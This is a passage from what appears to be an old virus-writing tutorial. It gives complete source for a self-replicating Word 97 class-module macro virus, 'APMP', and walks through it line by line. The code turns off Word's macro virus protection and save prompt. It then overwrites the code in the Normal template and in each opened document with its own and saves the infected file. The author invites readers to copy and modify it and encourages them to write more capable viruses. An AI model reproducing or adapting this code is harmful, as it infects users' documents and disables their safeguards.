use a private one,  so that it can remain with the same name in document or
template.

    First I will show you a  very basic advanced  class macro.  It's called
Class.APMP and  written for the only  purpose as an instructional virus for
this tutorial, so feel free and copy the code and modify it.


---[ code starts here ]----------------------------------------------------

'APMP
Private Sub Document_Open()
On Error Resume Next
Application.DisplayStatusBar = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
OurCode = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 20)
Set Host = NormalTemplate.VBProject.VBComponents(1).CodeModule
If ThisDocument = NormalTemplate Then _
 Set Host = ActiveDocument.VBProject.VBComponents(1).CodeModule
With Host
 If .Lines(1, 1) &lt;&gt; "'APMP" Then
     .DeleteLines 1, .CountOfLines
     .InsertLines 1, OurCode
     If ThisDocument = NormalTemplate Then _
      ActiveDocument.SaveAs ActiveDocument.FullName
 End If
End With
MsgBox "Basic class macro by jackie", 0, "APMP"
End Sub

---[ code ends here ]------------------------------------------------------


    As you see,  this code is much  shorter than the original one of Class.
Poppy. Well, I will now walk throug every line of code,  so that you under-
stand everything. First, this virus has no stealth and a message payload.

---------------------------------------------------------------------------
'APMP
---------------------------------------------------------------------------

    Well, this is our infection marker.  Our virus checks if this marker is
present in the  first line of the class object.  It is just a comment which
identifies our virus.

---------------------------------------------------------------------------
Private Sub Document_Open()
---------------------------------------------------------------------------

    As you heard, this macro gets active on opening. Remember the 'Private'
in front of the sub routine. We don't need to change it.

---------------------------------------------------------------------------
On Error Resume Next
---------------------------------------------------------------------------

    If an error happens, just execute the next command.

---------------------------------------------------------------------------
Application.DisplayStatusBar = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
---------------------------------------------------------------------------

    Again the basic commands of a macro.

---------------------------------------------------------------------------
OurCode = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 20)
---------------------------------------------------------------------------

    Save the whole virus code into the variable  'OurCode' . Remember,  our
code starts from line one until 19, because it's 19 lines long. ;)

---------------------------------------------------------------------------
Set Host = NormalTemplate.VBProject.VBComponents(1).CodeModule
---------------------------------------------------------------------------

    Set our class object to infect in the template.

---------------------------------------------------------------------------
If ThisDocument = NormalTemplate Then _
 Set Host = ActiveDocument.VBProject.VBComponents(1).CodeModule
---------------------------------------------------------------------------

   So, if the executed code is in the template, we should switch the object
variable to the active document, that we can infect it.

---------------------------------------------------------------------------
With Host
 If .Lines(1, 1) &lt;&gt; "'APMP" Then
     .DeleteLines 1, .CountOfLines
     .InsertLines 1, OurCode
     If ThisDocument = NormalTemplate Then _
      ActiveDocument.SaveAs ActiveDocument.FullName
 End If
End With
---------------------------------------------------------------------------

    First we check  if the first line of the class object we want to infect
isn't our marker.  If it isn't so we delete  all lines in the class object,
then we insert our viral code into it. So if we have just infected a docum-
ent, we should save it under it's fullname.

---------------------------------------------------------------------------
MsgBox "Basic class macro by jackie", 0, "APMP"
---------------------------------------------------------------------------

    Hehe, this is our payload.

---------------------------------------------------------------------------
End Sub
---------------------------------------------------------------------------

    No comment ;)

    What you see here is the common infection technic which I use in my lil
creations. It is very fast and small, the smaller the better, hehehe. There
was also a smallest macro virus contest,  if you want to take a look on it,
just get  LineZer0 Network Zine #2  and read the full article about it plus
full commented source codes.

    Well, here the Word 97 part ends.  I hope I could help you with it.  If
you don't understand something or have any comments or questions, feel free
and mail me.  Maybe I should tell you,  that you have one problem,  because
there are too much,  I say too much bad Word macros around.  So I hope this
tutorial can help  you to write  some good macros,  which aren't as lame as
most of the macros out there! Now spotlight on Excel!
